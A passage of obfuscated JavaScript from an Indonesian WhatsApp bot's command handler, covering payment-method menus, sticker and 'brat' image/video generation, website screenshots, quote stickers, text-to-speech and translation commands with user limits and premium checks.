            'buttonParamsJson': "{\n\t\t\t\t\t\t\"title\": \"Metode Pembayaran\",\n\t\t\t\t\t\t\"sections\": [\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"title\": \"Pilih Metode Pembayaran\",\n\t\t\t\t\t\t\t\t\"rows\": [\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"💳 Dana\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"Dana - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod dana\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"💵 GoPay\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"GoPay - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod gopay\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"📱 OVO\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"OVO - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod ovo\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"🔗 QRIS\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"QRIS - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod qris\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"🛍️ ShopeePay\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"ShopeePay - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod shopeepay\"\n\t\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\"header\": \"🏦 SeaBank\",\n\t\t\t\t\t\t\t\t\t\t\"title\": \"SeaBank - Pilih untuk detail\",\n\t\t\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "paymethod seabank\"\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t]\n\t\t\t\t\t}"
          }];
          _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x21b2d7, "Silakan pilih metode pembayaran di bawah ini untuk melanjutkan transaksi:", "Metode Pembayaran", _0x3f87c6);
        }
        break;
      case "paymethod":
        {
          if (!_0x143458[0x0]) {
            _0x3a091f("Silakan pilih metode pembayaran:\n\n💳 *Dana*: " + (_0x4773c6 + _0x4ac520) + " dana\n💵 *GoPay*: " + (_0x4773c6 + _0x4ac520) + " gopay\n📱 *OVO*: " + (_0x4773c6 + _0x4ac520) + " ovo\n🔗 *QRIS*: " + (_0x4773c6 + _0x4ac520) + " qris\n🛍️ *ShopeePay*: " + (_0x4773c6 + _0x4ac520) + " shopeepay\n🏦 *SeaBank*: " + (_0x4773c6 + _0x4ac520) + " seabank");
          } else {
            switch (_0x143458[0x0].toLowerCase()) {
              case "dana":
                _0x3a091f("💳 *Dana*\n\nSilakan transfer ke nomor berikut:\n*" + payment.dana + "*\n\nSetelah transfer, kirim bukti pembayaran ke sini.");
                break;
              case "gopay":
                _0x3a091f("💵 *GoPay*\n\nSilakan transfer ke nomor berikut:\n*" + payment.gopay + "*\n\nSetelah transfer, kirim bukti pembayaran ke sini.");
                break;
              case 'ovo':
                _0x3a091f("📱 *OVO*\n\nSilakan transfer ke nomor berikut:\n*" + payment.ovo + "*\n\nSetelah transfer, kirim bukti pembayaran ke sini.");
                break;
              case "qris":
                let _0x22ca59 = await getBuffer('' + payment.qris);
                await _0x3a091f("🔗 *QRIS*\n\nScan QR berikut untuk melakukan pembayaran:");
                _0x3f87c6.reply({
                  'image': _0x22ca59,
                  'caption': "Scan QR ini untuk pembayaran."
                });
                break;
              case "shopeepay":
                _0x3a091f("🛍️ *ShopeePay*\n\nSilakan transfer ke nomor berikut:\n*" + payment.shopeePay + "*\n\nSetelah transfer, kirim bukti pembayaran ke sini.");
                break;
              case "seabank":
                _0x3a091f("🏦 *SeaBank*\n\nSilakan transfer ke nomor rekening berikut:\n*" + payment.seabank + "*\n\nSetelah transfer, kirim bukti pembayaran ke sini.");
                break;
              default:
                _0x3a091f("Metode pembayaran tidak valid. Pilih salah satu dari:\n\n💳 *Dana*\n💵 *GoPay*\n📱 *OVO*\n🔗 *QRIS*\n🛍️ *ShopeePay*\n🏦 *SeaBank*");
            }
          }
        }
        ;
        break;
      case "tes":
      case 'test':
        {
          _0x3f87c6.reply({
            'text': "Ini adalah teks di bagian judul.",
            'footer': "Ini adalah teks di bagian footer.",
            'buttons': [{
              'buttonId': ".me",
              'buttonText': {
                'displayText': '🙂'
              }
            }, {
              'buttonId': '.me',
              'buttonText': {
                'displayText': '😐'
              }
            }, {
              'buttonId': '.me',
              'buttonText': {
                'displayText': '☹️'
              }
            }],
            'viewOnce': true
          });
        }
        break;
      case "owner":
      case "creator":
        {
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'contacts': {
              'displayName': ownerName,
              'contacts': contacts
            }
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "brat":
      case 'anomali':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Contoh : " + (_0x4773c6 + _0x4ac520) + " Hai kak");
          }
          if (_0x2b2627.length > 0x65) {
            return _0x3a091f("Karakter terbatas, max 100!");
          }
          _0x3f87c6.reply({
            'text': "Silakan pilih buttone di bawah ya der, mau gambar atau video? || kalo gada buttone di bawah, lu ketik aja .bratgambar kokorey gantenk",
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + "bratgambar " + _0x2b2627,
              'buttonText': {
                'displayText': "Gambar"
              }
            }, {
              'buttonId': _0x4773c6 + "bratvideo " + _0x2b2627,
              'buttonText': {
                'displayText': 'Video'
              }
            }],
            'viewOnce': true
          });
        }
        break;
      case 'bratgambar':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (_0x3f87c6.sender in enhance) {
            return _0x3a091f("Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Contoh : " + (_0x4773c6 + _0x4ac520) + " Hai kak");
          }
          if (_0x2b2627.length > 0x65) {
            return _0x3a091f("Karakter terbatas, max 100!");
          }
          enhance[_0x3f87c6.sender] = true;
          await _0x3f87c6.react('⏱️');
          try {
            const _0x5c192e = await getBuffer("https://brat.caliphdev.com/api/brat?text=" + encodeURIComponent(_0x2b2627));
            await _0x3f87c6.react('✅');
            _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x5c192e, _0x3f87c6, {
              'packname': botName,
              'author': ownerName
            });
          } catch (_0x495c3b) {
            _0x3a091f("Terjadi kesalahan saat membuat stiker gambar. 😞");
          }
          delete enhance[_0x3f87c6.sender];
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "bratvideo":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (_0x3f87c6.sender in enhance) {
            return _0x3a091f("Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Contoh : " + (_0x4773c6 + _0x4ac520) + " Hai kak");
          }
          if (_0x2b2627.length > 0x65) {
            return _0x3a091f("Karakter terbatas, max 100!");
          }
          enhance[_0x3f87c6.sender] = true;
          const _0x19c196 = _0x2b2627.split(" ");
          const _0x4f3998 = path.join(process.cwd(), "temp");
          if (!fs.existsSync(_0x4f3998)) {
            fs.mkdirSync(_0x4f3998);
          }
          const _0x8efb4c = [];
          await _0x3f87c6.react('⏱️');
          try {
            for (let _0x5d8414 = 0x0; _0x5d8414 < _0x19c196.length; _0x5d8414++) {
              const _0x542d33 = _0x19c196.slice(0x0, _0x5d8414 + 0x1).join(" ");
              const _0x4bc271 = await axios.get('https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(_0x542d33), {
                'responseType': 'arraybuffer'
              })["catch"](_0x596bd9 => _0x596bd9.response);
              const _0xd12dd7 = path.join(_0x4f3998, 'frame' + _0x5d8414 + ".mp4");
              fs.writeFileSync(_0xd12dd7, _0x4bc271.data);
              _0x8efb4c.push(_0xd12dd7);
            }
            const _0x3c9251 = path.join(_0x4f3998, "filelist.txt");
            let _0x462bdd = '';
            for (let _0x5ae9ab = 0x0; _0x5ae9ab < _0x8efb4c.length; _0x5ae9ab++) {
              _0x462bdd += "file '" + _0x8efb4c[_0x5ae9ab] + "'\n";
              _0x462bdd += "duration 0.7\n";
            }
            _0x462bdd += "file '" + _0x8efb4c[_0x8efb4c.length - 0x1] + "'\n";
            _0x462bdd += "duration 2\n";
            fs.writeFileSync(_0x3c9251, _0x462bdd);
            const _0x570965 = path.join(_0x4f3998, "output.mp4");
            await execSync("ffmpeg -y -f concat -safe 0 -i " + _0x3c9251 + " -vf \"fps=30\" -c:v libx264 -preset ultrafast -pix_fmt yuv420p " + _0x570965);
            await _0x3f87c6.react('✅');
            await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x570965, _0x3f87c6, {
              'packname': botName,
              'author': ownerName
            });
            _0x8efb4c.forEach(_0x138d00 => {
              if (fs.existsSync(_0x138d00)) {
                fs.unlinkSync(_0x138d00);
              }
            });
            if (fs.existsSync(_0x3c9251)) {
              fs.unlinkSync(_0x3c9251);
            }
            if (fs.existsSync(_0x570965)) {
              fs.unlinkSync(_0x570965);
            }
          } catch (_0x10ae71) {
            console.error(_0x10ae71);
            _0x3a091f(mess.error);
          }
          delete enhance[_0x3f87c6.sender];
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "ssw":
      case 'ssweb':
        {
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x143458[0x0]) {
            return _0x3a091f("📸 *Cara Pakai Screenshot Web!*\n\n" + ("Gunakan perintah: " + (_0x4773c6 + _0x4ac520) + " <tipe> <url web>\n\n") + "📌 *Tipe yang tersedia:*\n" + " ⌬ 📱 hp → Tampilan mobile\n" + " ⌬ 💻 pc → Tampilan desktop\n" + " ⌬ 📟 tab → Tampilan tablet\n\n" + "🔍 *Contoh penggunaan:*\n" + (_0x4773c6 + _0x4ac520 + " hp https://www.ryzenoffc.my.id"));
          }
          if (!_0x143458[0x1]) {
            return _0x3a091f("⚠️ *URL tidak boleh kosong!*\n\n" + ("Gunakan format: " + (_0x4773c6 + _0x4ac520) + " <tipe> <url web>\n\n") + ("💡 *Contoh:*\n" + (_0x4773c6 + _0x4ac520) + " hp https://www.ryzenoffc.my.id"));
          }
          const _0x55e6fe = await ["1b484c", "965abb", "731a82", "194174"][Math.floor(Math.random() * ["1b484c", "965abb", "731a82", "194174"].length)];
          let _0x132e14;
          let _0x518a4b;
          let _0x23ced6;
          if (_0x143458[0x0] === 'hp') {
            _0x132e14 = "phone";
            _0x518a4b = "480x800";
            _0x23ced6 = "📱 Mobile View";
          } else {
            if (_0x143458[0x0] === 'pc') {
              _0x132e14 = "desktop";
              _0x518a4b = "1024x768";
              _0x23ced6 = "💻 Desktop View";
            } else {
              if (_0x143458[0x0] === 'tab') {
                _0x132e14 = 'tablet';
                _0x518a4b = '800x1280';
                _0x23ced6 = "📟 Tablet View";
              } else {
                return _0x3a091f("❌ *Tipe tidak dikenali!*\n\nGunakan salah satu tipe berikut:\n ⌬ 📱 hp\n ⌬ 💻 pc\n ⌬ 📟 tab\n\n" + ("💡 *Contoh:*\n" + (_0x4773c6 + _0x4ac520) + " hp https://www.ryzenoffc.my.id"));
              }
            }
          }
          if (db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("⛔ *Limit habis!*\nSilakan hubungi pemilik bot untuk mendapatkan limit tambahan.\n\n" + ("📞 *Owner:* " + _0x3e4b1d));
          }
          await _0x3f87c6.react('📸');
          try {
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': "https://api.screenshotmachine.com/?key=" + _0x55e6fe + "&url=" + _0x143458[0x1] + "&device=" + _0x132e14 + "&dimension=" + _0x518a4b + "&format=png&cacheLimit=0&delay=1000"
              },
              'caption': "✅ *Screenshot Berhasil!*\n\n" + ("🔗 *URL:* " + _0x143458[0x1] + "\n") + ("📌 *Tipe:* " + _0x23ced6 + "\n") + ("⏳ *Waktu proses:* " + _0x2f9700.toFixed(0x4) + "s\n\n") + "🚀 Screenshot siap digunakan!"
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x4de5e5) {
            console.error(_0x4de5e5);
            _0x3a091f("❌ Gagal mengambil screenshot! Pastikan URL yang diberikan benar atau coba lagi nanti.");
          }
        }
        break;
      case "quotechat":
      case "quote":
      case 'qc':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Input teksnya!");
          }
          const _0x593851 = _0x3f87c6.sender;
          const _0x586f9d = await _0x59f5fa.getName(_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x593851);
          const _0x1ce5ef = await _0x59f5fa.profilePictureUrl(_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x593851, "image")["catch"](() => 'https://8030.us.kg/file/P2LpaOHxWlJt.jpg');
          const _0x593476 = {
            'type': "quote",
            'format': "png",
            'backgroundColor': "#FFFFFF",
            'width': 0x200,
            'height': 0x200,
            'scale': 0x2,
            'messages': [{
              'entities': [],
              'avatar': true,
              'from': {
                'id': 0x1,
                'name': _0x586f9d,
                'photo': {
                  'url': _0x1ce5ef
                }
              },
              'text': _0x2b2627,
              'replyMessage': {}
            }]
          };
          axios.post("https://bot.lyo.su/quote/generate", _0x593476, {
            'headers': {
              'Content-Type': "application/json"
            }
          }).then(async _0x21d6c9 => {
            const _0x39aa8f = Buffer.from(_0x21d6c9.data.result.image, 'base64');
            let _0x44e2ce = await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x39aa8f, _0x3f87c6, {
              'packname': botName,
              'author': ownerName,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x64,
              'background': "transparent"
            });
            await fs.unlinkSync(_0x44e2ce);
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'quotecolor':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Input teksnya!");
          }
          const _0x5d0b92 = _0x3f87c6.sender;
          const _0x30dabe = await _0x59f5fa.getName(_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x5d0b92);
          const _0xb45f9e = await _0x59f5fa.profilePictureUrl(_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x5d0b92, "image")["catch"](() => "https://8030.us.kg/file/P2LpaOHxWlJt.jpg");
          const _0x39edc4 = _0x2b2627.split(" ");
          const _0x3f65b9 = /^#[0-9A-F]{6}$/i.test(_0x39edc4[_0x39edc4.length - 0x1]) ? _0x39edc4.pop() : "#FFFFFF";
          const _0x3382c3 = _0x39edc4.join(" ");
          if (!/^#[0-9A-F]{6}$/i.test(_0x3f65b9)) {
            return _0x3a091f("Warna background tidak valid! Gunakan format hex seperti #FF5733.");
          }
          const _0x2a364c = {
            'type': 'quote',
            'format': 'png',
            'backgroundColor': _0x3f65b9,
            'width': 0x200,
            'height': 0x200,
            'scale': 0x2,
            'messages': [{
              'entities': [],
              'avatar': true,
              'from': {
                'id': 0x1,
                'name': _0x30dabe,
                'photo': {
                  'url': _0xb45f9e
                }
              },
              'text': _0x3382c3,
              'replyMessage': {}
            }]
          };
          try {
            const _0x559007 = await axios.post("https://bot.lyo.su/quote/generate", _0x2a364c, {
              'headers': {
                'Content-Type': "application/json"
              }
            });
            const _0x15507f = Buffer.from(_0x559007.data.result.image, "base64");
            let _0x1e2037 = await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x15507f, _0x3f87c6, {
              'packname': botName,
              'author': ownerName,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x64,
              'background': 'transparent'
            });
            await fs.unlinkSync(_0x1e2037);
          } catch (_0x58cb8d) {
            console.error(_0x58cb8d);
            _0x3a091f("❌ Terjadi kesalahan saat memproses request. Coba lagi nanti!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 's':
      case "sticker":
      case 'stiker':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Aduh, kak, limitmu habis! 🥲 Coba upgrade jadi premium ya!");
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim atau balas gambar/video/gif dengan caption " + (_0x4773c6 + _0x4ac520) + "\nDurasi video 1-9 detik ya!");
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim atau balas gambar/video/gif dengan caption " + (_0x4773c6 + _0x4ac520) + "\nDurasi video 1-9 detik ya!");
          }
          if (/image/.test(_0x3df746)) {
            await _0x3f87c6.react('⏱️');
            let _0xc65fcb = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0xc65fcb, _0x3f87c6, {
              'packname': global.packname,
              'author': global.author
            });
          } else {
            if (/video/.test(_0x3df746)) {
              if ((_0x5dba36.msg || _0x5dba36).seconds > 0x9) {
                return _0x3a091f("Durasi video terlalu panjang! 🕒 Kirim video dengan durasi 1-9 detik ya!");
              }
              await _0x3f87c6.react('⏱️');
              let _0xdf0a51 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              await _0x59f5fa.sendVideoAsSticker(_0x3f87c6.chat, _0xdf0a51, _0x3f87c6, {
                'packname': global.packname,
                'author': global.author
              });
            } else {
              _0x3a091f("Kirim atau balas gambar/video/gif dengan caption " + (_0x4773c6 + _0x4ac520) + "\nDurasi video 1-9 detik ya!");
            }
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "swm":
      case 'steal':
      case "stickerwm":
      case "take":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Aduh, kak, limitmu habis! 🥲 Coba upgrade jadi premium ya!");
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Kirim atau balas gambar/video/gif dengan caption " + (_0x4773c6 + _0x4ac520) + "\nDurasi video 1-9 detik ya!");
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim atau balas gambar/video/gif dengan caption " + (_0x4773c6 + _0x4ac520) + "\nDurasi video 1-9 detik ya!");
          }
          const _0x202164 = _0x143458.join(" ");
          const _0x74f49b = _0x202164.split('|')[0x0];
          const _0x1997a7 = _0x202164.split('|')[0x1];
          if (_0x3f87c6.quoted.isAnimated === true) {
            let _0x2704b3 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'sticker': _0x2704b3
            }, _0x3f87c6, {
              'packname': _0x74f49b,
              'author': _0x1997a7
            });
          } else {
            if (/image/.test(_0x3df746)) {
              let _0x291661 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0x291661, _0x3f87c6, {
                'packname': _0x74f49b,
                'author': _0x1997a7
              });
            } else {
              if (/video/.test(_0x3df746)) {
                if ((_0x5dba36.msg || _0x5dba36).seconds > 0x9) {
                  return _0x3a091f("Video terlalu panjang, maksimal 9 detik ya! ⏳");
                }
                let _0x15732f = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
                await _0x59f5fa.sendVideoAsSticker(_0x3f87c6.chat, _0x15732f, _0x3f87c6, {
                  'packname': _0x74f49b,
                  'author': _0x1997a7
                });
              } else {
                _0x3a091f("Kirim foto/video untuk dipakai ya, kak!");
              }
            }
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'smeme':
      case "stickermeme":
      case "stickmeme":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Limit habis, kak! Coba upgrade premium untuk lanjut!");
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!/webp/.test(_0x3df746) && /image/.test(_0x3df746)) {
            if (!_0x2b2627) {
              return _0x3a091f("Penggunaan: " + (_0x4773c6 + _0x4ac520) + " teks_atas|teks_bawah");
            }
            atas = _0x2b2627.split('|')[0x0] ? _0x2b2627.split('|')[0x0] : '';
            bawah = _0x2b2627.split('|')[0x1] ? _0x2b2627.split('|')[0x1] : '';
            let _0x47d588 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            let _0x4073cf = await CatBox(_0x47d588);
            let _0xebea00 = "https://api.memegen.link/images/custom/" + encodeURIComponent(atas) + '/' + encodeURIComponent(bawah) + '.png?background=' + _0x4073cf;
            await _0x59f5fa.sendImageAsSticker(_0x3f87c6.chat, _0xebea00, _0x3f87c6, {
              'packname': global.packname,
              'author': global.author
            });
          } else {
            _0x3a091f("Kirim atau balas gambar dengan caption " + (_0x4773c6 + _0x4ac520) + " teks_atas|teks_bawah untuk membuat meme!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'ttsbluearchive':
      case "ttsba":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yahh, maaf kak, limit Kamu udah habis. Kalau mau lebih banyak, coba upgrade ke premium ya! 😘");
          }
          if (!_0x256404) {
            return _0x3a091f("Fitur ini cuma buat yang premium kak, coba di-upgrade dulu yuk biar KoKoRey bisa bantu lebih banyak! 😇");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Hmm, kayaknya ada yang kurang deh, coba gini kak:\n" + (_0x4773c6 + _0x4ac520) + " Aku suka nasi goreng,momoi");
          }
          try {
            let [_0x5c2ed4, _0x2984ce, _0xa1ac21] = _0x2b2627.split(',');
            if (!_0x5c2ed4 || !_0x2984ce) {
              return _0x3a091f("Yuk dicoba lagi kak! Contohnya gini ya:\n" + (_0x4773c6 + _0x4ac520) + " Aku suka nasi goreng,momoi");
            }
            const _0x5225d3 = ['airi', "akane", "akari", "ako", "aris", 'arona', "aru", "asuna", "atsuko", "ayane", "azusa", 'cherino', "chihiro", "chinatsu", "chise", "eimi", "erica", "fubuki", "fuuka", 'hanae', "hanako", "hare", 'haruka', "haruna", "hasumi", 'hibiki', "hihumi", "himari", "hina", "hinata", "hiyori", "hoshino", "iori", "iroha", "izumi", 'izuna', "juri", "kaede", "karin", "kayoko", "kazusa", "kirino", "koharu", 'kokona', "kotama", 'kotori', 'main', 'maki', "mari", 'marina', 'mashiro', "michiru", "midori", "miku", 'mimori', "misaki", 'miyako', "miyu", "moe", 'momoi', "momoka", 'mutsuki', "NP0013", 'natsu', "neru", 'noa', 'nodoka', 'nonomi', "pina", "rin", "saki", "saori", 'saya', 'sena', "serika", "serina", "shigure", "shimiko", 'shiroko', "shizuko", "shun", "ShunBaby", "sora", 'sumire', "suzumi", "tomoe", "tsubaki", "tsurugi", 'ui', "utaha", "wakamo", "yoshimi", 'yuuka', "yuzu", 'zunko'];
            if (!_0x5225d3.includes(_0x2984ce.toLowerCase())) {
              const _0x5d582d = _0x5225d3.map(_0x4ac419 => _0x4ac419.charAt(0x0).toUpperCase() + _0x4ac419.slice(0x1)).sort().map(_0xe553a2 => "- " + _0xe553a2).join("\n");
              return _0x3a091f("Hmm, karakter yang Kamu pilih gak ada nih! 😢\nCoba pilih salah satu dari daftar ini ya:\n\n" + _0x5d582d);
            }
            _0x3a091f("Tunggu sebentar ya kak, KoKoRey lagi proses nih! 🥰");
            const _0x553830 = new BlueArchive();
            const _0x194f75 = await translate(_0x5c2ed4, {
              'to': 'ja',
              'autoCorrect': false
            });
            const _0x3afe3a = await _0x553830.voice(_0x194f75[0x0], _0x2984ce.charAt(0x0).toUpperCase() + _0x2984ce.slice(0x1), _0xa1ac21 || 0x1);
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'audio': {
                'url': _0x3afe3a.result.url
              },
              'mimetype': "audio/mp4",
              'ptt': true
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x8b2dd1) {
            console.error(_0x8b2dd1);
            _0x3a091f("Aduh kak, ada yang error nih, maaf banget ya! Coba ulang lagi nanti! 😔");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'tts':
      case 'texttosound':
      case "audio":
      case "say":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yahh, maaf kak, limit Kamu udah habis. Kalau mau lebih banyak, coba upgrade ke premium yuk! 🥺");
          }
          if (!_0x256404) {
            return _0x3a091f("Fitur ini cuma buat yang premium kak, coba upgrade dulu ya biar bisa akses semuanya! 😇");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Cara pakenya gini kak:\n" + (_0x4773c6 + _0x4ac520) + " text\n\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " yaya 😁");
          }
          let _0x269c55 = _0x2b2627.split('--')[0x1];
          try {
            if (!_0x269c55) {
              _0x269c55 = 'id';
            }
            long = 'id';
            function _0x59f553(_0x43c631, _0x4aabb5 = 'id') {
              return new Promise((_0x418740, _0x50fe22) => {
                try {
                  let _0x4415d6 = gtts(_0x4aabb5);
                  let _0x54c88f = path.join(__dirname, "./temp", 0x1 * new Date() + ".wav");
                  _0x4415d6.save(_0x54c88f, _0x43c631, () => {
                    _0x418740(fs.readFileSync(_0x54c88f));
                    fs.unlinkSync(_0x54c88f);
                  });
                } catch (_0x234847) {
                  _0x50fe22(_0x234847);
                }
              });
            }
            let _0x58d52e;
            try {
              _0x58d52e = await _0x59f553(_0x2b2627, long);
            } catch (_0x48cdc5) {
              _0x3a091f("Hmm, ada yang salah nih, coba lagi ya! 🥲");
              _0x58d52e = await _0x59f553(_0x2b2627);
            } finally {
              const _0x2670eb = {
                'audio': _0x58d52e,
                'mimetype': "audio/mp4"
              };
              if (/say/.test(_0x4ac520)) {
                _0x2670eb.ptt = true;
              }
              _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x2670eb, {
                'quoted': _0x3f87c6
              });
            }
          } catch (_0x36284c) {
            console.log(_0x36284c);
            _0x3a091f("Aduh kak, error nih. KoKoRey gak sengaja, coba lagi ya! 🙏");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "translate":
      case 'tr':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yahh, limit Kamu habis nih. Coba upgrade premium ya, biar lebih bebas! 😊");
          }
          if (!_0x2b2627) {
            return _0x3a091f("Kak, cara pakainya gini ya:\n\n1. Kirim perintah " + (_0x4773c6 + _0x4ac520) + " *kode bahasa* *message*\n•*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " id Hello\n\n2. Balas chat dengan caption " + (_0x4773c6 + _0x4ac520) + " *kode bahasa*\n•*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " en halo\n\nDaftar bahasa lengkap bisa cek di sini kak: https://cloud.google.com/translate/docs/languages");
          }
          try {
            let _0x23f639 = _0x3f87c6.quoted ? _0x3f87c6.quoted.text : _0x2b2627.split(_0x143458[0x0])[0x1];
            if (!_0x23f639) {
              return _0x3a091f("Hmm, kayaknya teksnya kurang lengkap deh kak. Coba dicek lagi ya! 🧐");
            }
            const _0x566d19 = await translate(_0x23f639, {
              'to': _0x143458[0x0]
            });
            _0x3a091f("Hasil terjemahan:\n\n" + _0x566d19.text + " 😊");
          } catch (_0xae5515) {
            console.log(_0xae5515);
            _0x3a091f("Yahh, KoKoRey gak sengaja bikin error nih kak. Coba ulang lagi ya! 🙏");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'tourl':
        {
          let _0x2e9b0b = "Halo Kak " + _0xdd1e8d + "! 🎉\n\nSaat ini, hanya server *8030* yang aktif untuk mengunggah gambar.\n\nPilih server *8030* untuk mengunggah gambar Kamu. Pilih salah satu opsi di bawah ini ya! 🌟";
          let _0x339034 = [{
            'name': "single_select",
